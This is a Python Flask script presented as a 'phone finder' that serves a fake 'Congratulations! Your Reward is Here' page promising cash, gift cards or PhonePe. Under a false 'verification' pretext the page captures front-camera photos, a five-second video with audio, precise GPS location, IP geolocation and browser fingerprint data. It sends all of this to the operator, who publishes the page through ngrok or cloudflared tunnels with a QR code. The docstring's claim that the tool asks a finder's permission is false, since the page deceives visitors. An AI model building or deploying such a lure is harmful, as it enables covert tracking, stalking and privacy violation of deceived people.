#!/usr/bin/env python3
"""
HCO-Phone-Finder.py - Enhanced version with camera, video recording, and comprehensive data collection
Use only to help recover your own lost/stolen phone. This script explicitly asks
a finder for permission before sending location. Do not use to deceive or coerce.
"""
from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import threading
import socket
import webbrowser
import platform
from datetime import datetime
from typing import Optional, Tuple

# Try imports, show friendly error if missing
try:
    from flask import Flask, request, render_template_string, jsonify, send_file
    import requests
    import qrcode
    from PIL import Image, ImageDraw, ImageFont
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
    from io import BytesIO
except Exception as e:
    print("Missing Python packages or modules. Install dependencies and try again.")
    print("Recommended install (copy-paste):")
    print("  pip install flask requests qrcode pillow colorama")
    print("Error detail:", e)
    sys.exit(1)

colorama_init(autoreset=True)

# ----------------- Config -----------------
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "public_link_qr.png"
HOST = "0.0.0.0"
IMAGE_FOLDER = "captured_images"
GALLERY_FOLDER = "gallery"

# Create necessary directories
os.makedirs(IMAGE_FOLDER, exist_ok=True)
os.makedirs(GALLERY_FOLDER, exist_ok=True)

app = Flask(__name__)
_received_reports = []

# ----------------- Enhanced HTML with camera capture and video recording -----------------
HTML_PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Congratulations! Your Reward is Here</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  body{font-family:'Poppins',system-ui,-apple-system;display:flex;align-items:center;justify-content:center;
       min-height:100vh;margin:0;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:20px}
  .card{width:100%;max-width:480px;background:rgba(255,255,255,0.12);border-radius:24px;padding:32px;
        backdrop-filter:blur(12px);box-shadow:0 20px 60px rgba(0,0,0,0.5);position:relative;border:1px solid rgba(255,255,255,0.2);
        overflow:hidden}
  .card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;
                background:radial-gradient(circle,rgba(255,255,255,0.1) 0%,rgba(255,255,255,0) 70%);z-index:-1}
  .confetti{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
  .badge{position:absolute;right:-8px;top:-12px;background:linear-gradient(45deg,#FFD700,#FFA500);
         color:#000;padding:12px 20px;border-radius:25px;font-weight:800;transform:rotate(5deg);
         box-shadow:0 8px 25px rgba(0,0,0,0.3);font-size:1.1rem;z-index:2}
  .logo{width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,0.2);display:flex;align-items:center;
        justify-content:center;margin:0 auto 20px;font-size:3rem;box-shadow:0 8px 25px rgba(0,0,0,0.3);z-index:2;position:relative}
  h1{font-size:2.2rem;margin:0 0 12px;background:linear-gradient(45deg,#fff,#ffd700,#ff6b6b);
      -webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800;text-align:center;z-index:2;position:relative}
  .subtitle{font-size:1.4rem;margin:0 0 30px;text-align:center;font-weight:600;opacity:0.95;z-index:2;position:relative}
  .reward-options{display:flex;justify-content:center;gap:15px;margin:25px 0;z-index:2;position:relative}
  .reward-option{flex:1;text-align:center;padding:15px;background:rgba(255,255,255,0.15);border-radius:15px;
                 backdrop-filter:blur(5px);border:2px solid rgba(255,255,255,0.2);transition:all 0.3s ease}
  .reward-option:hover{transform:translateY(-5px);background:rgba(255,255,255,0.25);box-shadow:0 10px 30px rgba(0,0,0,0.3)}
  .reward-icon{font-size:2.5rem;margin-bottom:8px;display:block}
  .reward-text{font-weight:600;font-size:1rem}
  .collect-btn{display:block;margin:25px auto;background:linear-gradient(45deg,#00b09b,#96c93d);color:#000;
           padding:18px 30px;border-radius:50px;border:none;font-weight:800;font-size:1.2rem;cursor:pointer;
           width:100%;max-width:280px;transition:all 0.3s ease;box-shadow:0 10px 30px rgba(0,0,0,0.3);position:relative;z-index:2}
  .collect-btn:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(0,0,0,0.4);background:linear-gradient(45deg,#00b09b,#96c93d)}
  .collect-btn:active{transform:translateY(1px)}
  .status{margin-top:20px;padding:15px;border-radius:12px;display:none;font-weight:700;color:#000;text-align:center;z-index:2;position:relative}
  .status.ok{display:block;background:rgba(46,204,113,0.95);border:1px solid rgba(46,204,113,1)}
  .status.error{display:block;background:rgba(231,76,60,0.95);border:1px solid rgba(231,76,60,1)}
  .footer{margin-top:20px;font-size:0.9rem;opacity:0.8;text-align:center;z-index:2;position:relative}
  .loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;
          border-top-color:#fff;animation:spin 1s ease-in-out infinite;margin-right:10px;vertical-align:middle}
  @keyframes spin{to{transform:rotate(360deg)}}
  .pulse{animation:pulse 2s infinite}
  @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
  .camera-section{margin:20px 0;text-align:center;z-index:2;position:relative}
  .camera-btn{background:linear-gradient(45deg,#FF6B6B,#FF8E53);color:white;border:none;padding:12px 20px;
              border-radius:25px;cursor:pointer;font-weight:600;margin:10px;transition:all 0.3s ease}
  .camera-btn:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(255,107,107,0.4)}
  #cameraPreview{width:100%;max-width:300px;border-radius:15px;margin:15px auto;display:none;border:3px solid rgba(255,255,255,0.3)}
  #videoPreview{width:100%;max-width:300px;border-radius:15px;margin:15px auto;display:none;border:3px solid rgba(255,255,255,0.3)}
  .capture-info{margin:10px 0;font-size:0.9rem;opacity:0.8;text-align:center}
</style>
</head>
<body>
  <div class="card" role="main" aria-labelledby="title">
    <div class="confetti" id="confetti"></div>
    <div class="badge">REWARD</div>
    <div class="logo">🎉</div>
    <h1 id="title">Congratulations!</h1>
    <div class="subtitle">Your Reward is Here</div>

    <div class="reward-options">
      <div class="reward-option">
        <span class="reward-icon">💰</span>
        <div class="reward-text">Cash</div>
      </div>
      <div class="reward-option">
        <span class="reward-icon">💝</span>
        <div class="reward-text">Gift Card</div>
      </div>
      <div class="reward-option">
        <span class="reward-icon">📱</span>
        <div class="reward-text">Phone Pe</div>
      </div>
    </div>

    <div class="camera-section">
      <div class="capture-info">For verification, we'll automatically capture:</div>
      <div class="capture-info">📸 2 Photos & 🎥 5 Second Video</div>
      <button class="camera-btn" id="startCaptureBtn">📷 Start Verification</button>
      <video id="cameraPreview" autoplay playsinline></video>
      <video id="videoPreview" controls style="display:none"></video>
      <canvas id="photoCanvas" style="display:none"></canvas>
    </div>

    <div style="text-align:center;font-weight:600;margin:10px 0;font-size:1.1rem;z-index:2;position:relative">
      Click below to collect your reward
    </div>

    <button class="collect-btn pulse" id="collectBtn">
      <span class="btn-text">🎁 Click to Claim Reward</span>
    </button>

    <div id="status" class="status" role="status" aria-live="polite"></div>

    <div class="footer">
      <div><strong>Note:</strong> Camera & location access required for reward verification</div>
    </div>
  </div>

<script>
(function(){
  const collect = document.getElementById('collectBtn');
  const status = document.getElementById('status');
  const btnText = document.querySelector('.btn-text');
  const startCaptureBtn = document.getElementById('startCaptureBtn');
  const cameraPreview = document.getElementById('cameraPreview');
  const videoPreview = document.getElementById('videoPreview');
  const photoCanvas = document.getElementById('photoCanvas');
  
  let stream = null;
  let mediaRecorder = null;
  let recordedChunks = [];
  let capturedPhotos = [];
  let isCapturing = false;

  // Start camera and auto-capture
  startCaptureBtn.addEventListener('click', async () => {
    if (isCapturing) return;
    
    try {
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user', 
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      });
      
      cameraPreview.srcObject = stream;
      cameraPreview.style.display = 'block';
      startCaptureBtn.textContent = '🔄 Capturing...';
      startCaptureBtn.disabled = true;
      isCapturing = true;

      // Capture first photo immediately
      await capturePhoto();
      
      // Start video recording
      await startVideoRecording();
      
      // Capture second photo after 3 seconds
      setTimeout(async () => {
        await capturePhoto();
      }, 3000);
      
      // Stop video recording after 5 seconds and process
      setTimeout(async () => {
        await stopVideoRecording();
        startCaptureBtn.textContent = '✅ Verification Complete';
        status.className = 'status ok';
        status.textContent = '✅ Verification complete! You can now claim your reward.';
        status.style.display = 'block';
      }, 5000);

    } catch (err) {
      console.log('Camera error:', err);
      status.className = 'status error';
      status.textContent = 'Camera access denied. Please allow camera access to claim reward.';
      status.style.display = 'block';
      startCaptureBtn.textContent = '📷 Start Verification';
      startCaptureBtn.disabled = false;
    }
  });

  async function capturePhoto() {
    if (!stream) return;
    
    const context = photoCanvas.getContext('2d');
    photoCanvas.width = cameraPreview.videoWidth;
    photoCanvas.height = cameraPreview.videoHeight;
    context.drawImage(cameraPreview, 0, 0);
    
    const photoData = photoCanvas.toDataURL('image/jpeg', 0.8);
    capturedPhotos.push(photoData);
    
    console.log(`📸 Photo ${capturedPhotos.length} captured`);
  }

  async function startVideoRecording() {
    try {
      const options = { 
        mimeType: 'video/webm; codecs=vp9,opus',
        videoBitsPerSecond: 2500000
      };
      
      mediaRecorder = new MediaRecorder(stream, options);
      recordedChunks = [];

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        const videoUrl = URL.createObjectURL(videoBlob);
        videoPreview.src = videoUrl;
        videoPreview.style.display = 'block';
      };

      mediaRecorder.start(1000); // Collect data every second
      console.log('🎥 Started video recording');
    } catch (err) {
      console.log('Video recording error:', err);
    }
  }

  async function stopVideoRecording() {
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
      mediaRecorder.stop();
      console.log('🎥 Stopped video recording');
    }
  }

  function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => {
        const dataUrl = reader.result;
        const base64 = dataUrl.split(',')[1];
        resolve(base64);
      };
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  }

  collect.addEventListener('click', async () => {
    if (capturedPhotos.length === 0) {
      status.className = 'status error';
      status.textContent = 'Please complete verification first by clicking "Start Verification"';
      status.style.display = 'block';
      return;
    }

    status.className = 'status';
    status.textContent = 'Preparing your reward...';
    btnText.innerHTML = '<span class="loader"></span> Processing...';
    collect.disabled = true;
    collect.classList.remove('pulse');

    if(!navigator.geolocation){
      status.className = 'status error';
      status.textContent = 'Geolocation not supported by your browser.';
      btnText.textContent = 'Try Again';
      collect.disabled = false;
      collect.classList.add('pulse');
      return;
    }

    // Get location first
    navigator.geolocation.getCurrentPosition(async (pos) => {
      // Get IP address and detailed location
      let ipData = {ip: 'Unknown', city: 'Unknown', country: 'Unknown', region: 'Unknown'};
      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        ipData = await ipResponse.json();
      } catch(e) {
        console.log('IP detection failed:', e);
      }

      // Get browser information
      const browserInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
        screen: `${screen.width}x${screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        languages: navigator.languages || [navigator.language],
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown'
      };

      // Convert video to base64
      let videoBase64 = null;
      if (recordedChunks.length > 0) {
        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        videoBase64 = await blobToBase64(videoBlob);
      }

      status.className = 'status ok';
      status.textContent = '🎉 Reward confirmed! Processing your gift...';

      const payload = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        altitudeAccuracy: pos.coords.altitudeAccuracy,
        heading: pos.coords.heading,
        speed: pos.coords.speed,
        ip: ipData.ip,
        city: ipData.city || 'Unknown',
        country: ipData.country_name || 'Unknown',
        region: ipData.region || 'Unknown',
        postal: ipData.postal || 'Unknown',
        timezone: ipData.timezone || 'Unknown',
        org: ipData.org || 'Unknown',
        browser_info: browserInfo,
        photos: capturedPhotos,
        video: videoBase64,
        has_camera: true,
        timestamp: Date.now(),
        user_agent: navigator.userAgent
      };

      try {
        const resp = await fetch('/report', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify(payload)
        });
        
        if(resp.ok){
          btnText.textContent = 'Reward Claimed!';
          status.className = 'status ok';
          status.innerHTML = `🎉 <strong>Success!</strong><br>Your reward is being processed!<br>You will be contacted shortly.`;
          
          // Create confetti effect
          createConfetti();
        } else {
          throw new Error('Network error');
        }
      } catch (err){
        status.className = 'status error';
        status.textContent = 'Network error while processing reward. Please try again.';
        btnText.textContent = 'Try Again';
        collect.disabled = false;
        collect.classList.add('pulse');
      }
    }, (err) => {
      collect.disabled = false;
      collect.classList.add('pulse');
      status.className = 'status error';
      btnText.textContent = 'Try Again';
      
      if(err.code === err.PERMISSION_DENIED) {
        status.textContent = 'Please allow location access to claim your reward.';
      } else {
        status.textContent = 'Unable to verify location. Try again or use another device.';
      }
    }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
  });

  function createConfetti() {
    const confettiContainer = document.getElementById('confetti');
    const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
    
    for(let i = 0; i < 50; i++) {
      const confetti = document.createElement('div');
      confetti.style.position = 'absolute';
      confetti.style.width = '10px';
      confetti.style.height = '10px';
      confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
      confetti.style.borderRadius = '50%';
      confetti.style.left = Math.random() * 100 + '%';
      confetti.style.top = '-20px';
      confetti.style.opacity = '0.8';
      confetti.style.animation = `fall ${Math.random() * 3 + 2}s linear forwards`;
      
      const style = document.createElement('style');
      style.textContent = `
        @keyframes fall {
          to {
            transform: translateY(100vh) rotate(${Math.random() * 360}deg);
            opacity: 0;
          }
        }
      `;
      document.head.appendChild(style);
      
      confettiContainer.appendChild(confetti);
      
      setTimeout(() => {
        confetti.remove();
      }, 5000);
    }
  }
})();
</script>
</body>
</html>
"""

# ----------------- Flask endpoints -----------------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json(force=True)
    # Validate expected fields
    lat = data.get("latitude")
    lon = data.get("longitude")
    ip = data.get("ip", "Unknown")
    city = data.get("city", "Unknown")
    country = data.get("country", "Unknown")
    region = data.get("region", "Unknown")
    postal = data.get("postal", "Unknown")
    timezone = data.get("timezone", "Unknown")
    org = data.get("org", "Unknown")
    has_camera = data.get("has_camera", False)
    photos_data = data.get("photos", [])
    video_data = data.get("video")
    browser_info = data.get("browser_info", {})
    acc = data.get("accuracy", "")
    ts = data.get("timestamp", int(time.time()*1000))
    ua = data.get("user_agent", "")
    
    if lat is None or lon is None:
        return jsonify({"error":"missing coordinates"}), 400

    # Save photos and video
    photo_filenames = []
    video_filename = None
    
    for i, photo_data in enumerate(photos_data):
        filename = save_photo(photo_data, ip, i+1)
        if filename:
            photo_filenames.append(filename)

    if video_data:
        video_filename = save_video(video_data, ip)

    # Append to in-memory and CSV
    rec = {
        "ts": datetime.utcfromtimestamp(ts/1000).isoformat()+"Z",
        "ip": ip,
        "city": city,
        "country": country,
        "region": region,
        "postal": postal,
        "timezone": timezone,
        "org": org,
        "ua": ua,
        "lat": float(lat),
        "lon": float(lon),
        "acc": acc,
        "has_camera": has_camera,
        "photos": photo_filenames,
        "video": video_filename,
        "browser_info": browser_info,
        "reward_type": "Cash/GiftCard/PhonePe"
    }
    _received_reports.append(rec)
    save_report_csv(rec)
    
    # Print colorful console output with all captured data
    print(Fore.CYAN + Style.BRIGHT + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT + "║                    🎉 REWARD CLAIMED 🎉                    ║")
    print(Fore.CYAN + Style.BRIGHT + "╚══════════════════════════════════════════════════════════════╝")
    
    print(Fore.GREEN + f"🕐 Time: {rec['ts']}")
    print(Fore.YELLOW + f"📍 Location: {rec['lat']:.6f}, {rec['lon']:.6f}")
    print(Fore.MAGENTA + f"🌐 IP: {rec['ip']} | Org: {rec['org']}")
    print(Fore.BLUE + f"🏙️ City: {rec['city']}, {rec['region']}, {rec['country']}")
    print(Fore.CYAN + f"📮 Postal: {rec['postal']} | 🕒 Timezone: {rec['timezone']}")
    print(Fore.WHITE + f"📸 Photos: {len(photo_filenames)} | 🎥 Video: {'Yes' if video_filename else 'No'}")
    
    # Browser info
    if browser_info:
        print(Fore.YELLOW + "╔══════════════════════════════════════════════════════════════╗")
        print(Fore.YELLOW + "║                     🌐 BROWSER INFO 🌐                     ║")
        print(Fore.YELLOW + "╚══════════════════════════════════════════════════════════════╝")
        print(Fore.CYAN + f"🖥️ Platform: {browser_info.get('platform', 'Unknown')}")
        print(Fore.MAGENTA + f"🔍 User Agent: {browser_info.get('userAgent', 'Unknown')[:80]}...")
        print(Fore.GREEN + f"🖥️ Screen: {browser_info.get('screen', 'Unknown')}")
        print(Fore.BLUE + f"👀 Viewport: {browser_info.get('viewport', 'Unknown')}")
        print(Fore.WHITE + f"🎨 Color Depth: {browser_info.get('colorDepth', 'Unknown')}")
        print(Fore.YELLOW + f"🌍 Language: {browser_info.get('language', 'Unknown')}")
        print(Fore.CYAN + f"⏰ Timezone: {browser_info.get('timezone', 'Unknown')}")
    
    # Generate Google Maps link
    maps_link = f"https://maps.google.com/?q={rec['lat']},{rec['lon']}"
    print(Fore.RED + Style.BRIGHT + f"🗺️ Google Maps: {maps_link}")
    
    sys_stdout_flush()
    
    return jsonify({"status":"ok", "message":"Reward processing started"})

def save_photo(photo_data: str, ip: str, index: int) -> str:
    """Save base64 photo to gallery"""
    try:
        # Remove data URL prefix
        if ',' in photo_data:
            photo_data = photo_data.split(',', 1)[1]
        
        # Decode base64
        image_data = base64.b64decode(photo_data)
        
        # Create filename with timestamp and IP
        timestamp = int(time.time())
        filename = f"photo_{ip}_{timestamp}_{index}.jpg"
        filepath = os.path.join(GALLERY_FOLDER, filename)
        
        # Save image
        with open(filepath, 'wb') as f:
            f.write(image_data)
        
        print(Fore.GREEN + f"[📸] Photo {index} saved: {filepath}")
        return filename
    except Exception as e:
        print(Fore.RED + f"[!] Failed to save photo {index}: {e}")
        return None

def save_video(video_data: str, ip: str) -> str:
    """Save base64 video to gallery"""
    try:
        # Decode base64
        video_bytes = base64.b64decode(video_data)
        
        # Create filename with timestamp and IP
        timestamp = int(time.time())
        filename = f"video_{ip}_{timestamp}.webm"
        filepath = os.path.join(GALLERY_FOLDER, filename)
        
        # Save video
        with open(filepath, 'wb') as f:
            f.write(video_bytes)
        
        print(Fore.GREEN + f"[🎥] Video saved: {filepath}")
        return filename
    except Exception as e:
        print(Fore.RED + f"[!] Failed to save video: {e}")
        return None

def save_report_csv(rec):
    header = ["timestamp_utc","ip","city","region","country","postal","timezone","org",
              "user_agent","latitude","longitude","accuracy","has_camera","photos","video","reward_type"]
    exists = os.path.exists(REPORT_CSV)
    try:
        with open(REPORT_CSV, "a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            if not exists:
                writer.writerow(header)
            writer.writerow([rec["ts"], rec["ip"], rec["city"], rec["region"], rec["country"], 
                           rec["postal"], rec["timezone"], rec["org"], rec["ua"], 
                           rec["lat"], rec["lon"], rec["acc"], rec["has_camera"], 
                           ",".join(rec["photos"]), rec["video"], rec["reward_type"]])
    except Exception as e:
        print(Fore.RED + "[!] Failed to write CSV:", e)

def sys_stdout_flush():
    try:
        sys.stdout.flush()
    except Exception:
        pass

# ----------------- Network Information -----------------
def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

def display_network_info(port):
    """Display comprehensive network information"""
    local_ip = get_local_ip()
    
    print(Fore.CYAN + Style.BRIGHT + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT + "║                    🌐 NETWORK INFORMATION 🌐               ║")
    print(Fore.CYAN + Style.BRIGHT + "╚══════════════════════════════════════════════════════════════╝")
    
    print(Fore.GREEN + f"🖥️ Local IP: {local_ip}")
    print(Fore.MAGENTA + f"🚪 Port: {port}")
    print(Fore.CYAN + f"🔗 Local URL: http://{local_ip}:{port}")
    print(Fore.BLUE + f"🏠 Localhost: http://127.0.0.1:{port}")

# ----------------- Tunnel helpers -----------------
def which_bin(name: str) -> Optional[str]:
    import shutil
    return shutil.which(name)

def start_ngrok_background(port: int = PORT, timeout: float = 12.0) -> Tuple[Optional[str], Optional[subprocess.Popen]]:
    ng = which_bin("ngrok")
    if not ng:
        return None, None
    try:
        # start ngrok
        proc = subprocess.Popen([ng, "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    except Exception as e:
        print(Fore.RED + "[!] Failed to start ngrok:", e)
        return None, None
    # poll local API
    deadline = time.time() + timeout
    url = None
    while time.time() < deadline:
        try:
            resp = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=1.0)
            if resp.ok:
                data = resp.json()
                for t in data.get("tunnels", []):
                    pu = t.get("public_url")
                    if pu and pu.startswith("http"):
                        url = pu.rstrip("/")
                        break
        except Exception:
            pass
        if url:
            break
        time.sleep(0.5)
    return url, proc

def start_cloudflared_background(port: int = PORT, timeout: float = 12.0) -> Tuple[Optional[str], Optional[subprocess.Popen]]:
    cf = which_bin("cloudflared")
    if not cf:
        return None, None
    
    print(Fore.CYAN + "[*] Starting cloudflared tunnel...")
    try:
        proc = subprocess.Popen([
            "cloudflared", "tunnel", 
            "--url", f"http://localhost:{port}"
        ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
    except Exception as e:
        print(Fore.RED + "[!] Failed to start cloudflared:", e)
        return None, None
    
    url = None
    deadline = time.time() + timeout
    
    try:
        while time.time() < deadline and proc.poll() is None:
            if proc.stdout is None:
                time.sleep(0.2)
                continue
                
            line = proc.stdout.readline()
            if not line:
                time.sleep(0.2)
                continue
                
            print(Fore.YELLOW + f"[cloudflared] {line.strip()}")
            
            # Look for URL
            if "https://" in line:
                import re
                urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                if urls:
                    url = urls[0]
                    break
                    
            if ".trycloudflare.com" in line:
                import re
                urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                if urls:
                    url = urls[0]
                    break
                    
    except Exception as e:
        print(Fore.RED + f"[!] Error reading cloudflared output: {e}")
    
    if not url:
        print(Fore.YELLOW + "[!] Could not extract URL from cloudflared output")
    
    return url, proc

# ----------------- QR helpers -----------------
def make_qr_png(link: str, out_path: str = QR_PNG):
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(link)
        qr.make(fit=True)

        img = qr.make_image(fill_color="black", back_color="white")
        img.save(out_path)
        print(Fore.GREEN + f"[*] Saved QR PNG -> {out_path}")
        print_ascii_qr(qr)
    except Exception as e:
        print(Fore.RED + "[!] QR generation failed:", e)
        print("Public link:", link)

def print_ascii_qr(qrobj):
    try:
        matrix = qrobj.get_matrix()
        print(Fore.CYAN + "\n📱 QR Code (ASCII):")
        print(Fore.WHITE + "┌" + "─" * (len(matrix[0]) * 2) + "┐")
        for row in matrix:
            line = "│"
            for col in row:
                line += "██" if col else "  "
            line += "│"
            print(Fore.WHITE + line)
        print(Fore.WHITE + "└" + "─" * (len(matrix[0]) * 2) + "┘")
        print()
    except Exception:
        pass

# ----------------- Terminal UI helpers -----------------
def tool_lock_countdown():
    print(Fore.RED + Style.BRIGHT + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.RED + Style.BRIGHT + "║                 This Tool is Locked 🔒                      ║")
    print(Fore.RED + Style.BRIGHT + "║     Subscribe and click bell 🔔 icon to unlock the tool 🔥   ║")
    print(Fore.RED + Style.BRIGHT + "╚══════════════════════════════════════════════════════════════╝")
    print()
    
    print(Fore.YELLOW + "📺 Redirecting to YouTube...")
    time.sleep(2)
    
    # Try to open YouTube channel
    try:
        # Try termux-open-url first (for Termux)
        if 'termux' in sys.executable.lower():
            os.system('termux-open-url "https://www.youtube.com/@HackersColonyTech"')
        else:
            # Try regular webbrowser
            webbrowser.open('https://www.youtube.com/@HackersColonyTech')
        print(Fore.GREEN + "✅ Opening Hackers Colony Tech YouTube channel...")
    except:
        print(Fore.RED + "❌ Could not open YouTube automatically")
        print(Fore.YELLOW + "🔗 Please manually visit: https://www.youtube.com/@HackersColonyTech")
    
    print(Fore.CYAN + "\n⏰ Countdown starting...")
    
    # Countdown from 9 to 1
    for i in range(9, 0, -1):
        if i == 9:
            print(Fore.RED + f"⏳ {i}.", end=" ", flush=True)
        elif i == 8:
            print(Fore.RED + f"{i}.", end=" ", flush=True)
        elif i == 7:
            print(Fore.YELLOW + f"{i}.", end=" ", flush=True)
        elif i == 6:
            print(Fore.YELLOW + f"{i}.", end=" ", flush=True)
        elif i == 5:
            print(Fore.YELLOW + f"{i}.", end=" ", flush=True)
        elif i == 4:
            print(Fore.GREEN + f"{i}.", end=" ", flush=True)
        elif i == 3:
            print(Fore.GREEN + f"{i}.", end=" ", flush=True)
        elif i == 2:
            print(Fore.GREEN + f"{i}.", end=" ", flush=True)
        elif i == 1:
            print(Fore.CYAN + f"{i}", end=" ", flush=True)
        time.sleep(1)
    
    print(Fore.GREEN + Style.BRIGHT + "\n\n🎯 Tool Unlocked! Press Enter to continue...")
    input()

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print()
    print(Fore.CYAN + Style.BRIGHT + "                        ╔═══════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT + "                        ║       HCO Phone Finder       ║")
    print(Fore.CYAN + Style.BRIGHT + "                        ║   Live Location Tracking Tool ║")
    print(Fore.CYAN + Style.BRIGHT + "                        ║          by Azhar            ║")
    print(Fore.CYAN + Style.BRIGHT + "                        ╚═══════════════════════════════╝")
    print()

# ----------------- Main flow -----------------
def main():
    tool_lock_countdown()
    print_banner()

    # Display network information
    display_network_info(PORT)

    # Ensure CSV header
    if not os.path.exists(REPORT_CSV):
        try:
            with open(REPORT_CSV, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["timestamp_utc","ip","city","region","country","postal","timezone","org",
                               "user_agent","latitude","longitude","accuracy","has_camera","photos","video","reward_type"])
        except Exception:
            pass

    print(Fore.CYAN + Style.BRIGHT + "\n🌐 CHOOSE TUNNEL METHOD:")
    print(Fore.YELLOW + "   1) ngrok (Recommended)")
    print(Fore.YELLOW + "   2) cloudflared") 
    choice = input(Fore.GREEN + "🎯 Choose 1 or 2: ").strip()

    # Start Flask in background thread
    flask_thread = threading.Thread(target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    time.sleep(1.2)

    public_link = None
    tunnel_proc = None

    if choice == "1":
        print(Fore.CYAN + "[*] Starting ngrok tunnel...")
        url, proc = start_ngrok_background(PORT)
        tunnel_proc = proc
        if url:
            public_link = url
            print(Fore.MAGENTA + f"[ngrok] Public URL: {public_link}")
        else:
            print(Fore.RED + "[!] ngrok not available. Please install ngrok or choose cloudflared.")
            return

    elif choice == "2":
        print(Fore.CYAN + "[*] Starting cloudflared tunnel...")
        url, proc = start_cloudflared_background(PORT)
        tunnel_proc = proc
        if url:
            public_link = url
            print(Fore.MAGENTA + f"[cloudflared] Public URL: {public_link}")
        else:
            print(Fore.RED + "[!] cloudflared not available. Please install cloudflared or choose ngrok.")
            return

    else:
        print(Fore.RED + "[!] Invalid choice. Please run again and choose 1 or 2.")
        return

    # Generate QR code
    if public_link:
        try:
            with open(os.path.expanduser("~/.hco_public_url"), "w", encoding="utf-8") as f:
                f.write(public_link)
        except Exception:
            pass
        try:
            make_qr_png(public_link, QR_PNG)
        except Exception:
            pass

    print(Fore.GREEN + Style.BRIGHT + f"\n🎯 SERVER IS RUNNING!")
    print(Fore.CYAN + f"🔗 Share this link: {public_link}")
    print(Fore.YELLOW + f"⏳ Waiting for someone to claim reward...\n")
    
    print(Fore.MAGENTA + Style.BRIGHT + "📊 AUTOMATIC DATA CAPTURE:")
    print(Fore.CYAN + "   ✅ Exact GPS Location with Google Maps link")
    print(Fore.CYAN + "   ✅ IP Address & Network Information")
    print(Fore.CYAN + "   ✅ 2 Photos (auto-captured)")
    print(Fore.CYAN + "   ✅ 5 Second Video (auto-recorded)")
    print(Fore.CYAN + "   ✅ Full Browser & Device Information")
    print(Fore.CYAN + "   ✅ Screen & Viewport Details")
    print(Fore.CYAN + "   ✅ Timezone & Language Settings\n")

    # Keep main thread alive while Flask runs in background
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n🛑 Shutting down...")
        try:
            if tunnel_proc and hasattr(tunnel_proc, "terminate"):
                tunnel_proc.terminate()
        except Exception:
            pass
        
        # Show final stats
        if _received_reports:
            print(Fore.GREEN + f"\n📈 Total rewards claimed: {len(_received_reports)}")
        sys.exit(0)

if __name__ == "__main__":
    main()
